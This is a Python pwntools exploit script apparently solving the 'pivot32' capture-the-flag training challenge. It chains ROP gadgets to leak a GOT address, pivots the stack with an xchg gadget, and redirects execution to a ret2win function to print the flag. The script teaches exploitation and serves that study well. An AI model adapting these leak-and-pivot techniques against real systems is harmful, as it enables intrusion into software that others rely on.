from pwn import *

elf = context.binary = ELF('./pivot32', checksec=False)
p = process()

rop = ROP(elf)

pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)

foothold_offset = 0x77d
ret2win_offset = 0x974

# Our stack pivot
pop_eax = rop.find_gadget(["pop eax", "ret"])[0]
xchg_eax_esp = elf.symbols.usefulGadgets + 2

# Need to call foothold_plt to populate GOT with function address
rop.call(elf.plt.foothold_function)
# Then call puts to leak the foothold_got address
rop.call(elf.plt.puts, [elf.got.foothold_function])
# Then return to main
rop.call(elf.symbols.main)

# Send payload 1 to leak the address
p.sendline(rop.chain())

# Our second payload to pivot to address we were given at beginning (where our payload 1 was injected)
rop = ROP(elf)
rop.raw([pop_eax, pivot_addr, xchg_eax_esp])

# Send payload 2 to pivot
info("Sending second payload to stack pivot")
p.sendlineafter('>', flat({44: rop.chain()}))

p.recvlines(2)
leaked_got_addresses = p.recv()
foothold_leak = unpack(leaked_got_addresses[:4].strip())
# Calculate offset to ret2win function
libpivot32_base = foothold_leak - foothold_offset
ret2win_addr = libpivot32_base + ret2win_offset

# Print out for confirmation
info("Leaked foothold_function@got:")
info("foothold_leak: %#x", foothold_leak)
info("libpivot32_base: %#x", libpivot32_base)
info("ret2win_addr: %#x", ret2win_addr)

# Our third (and final) payload to retrieve out flag
p.sendline(flat({44: ret2win_addr}))
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)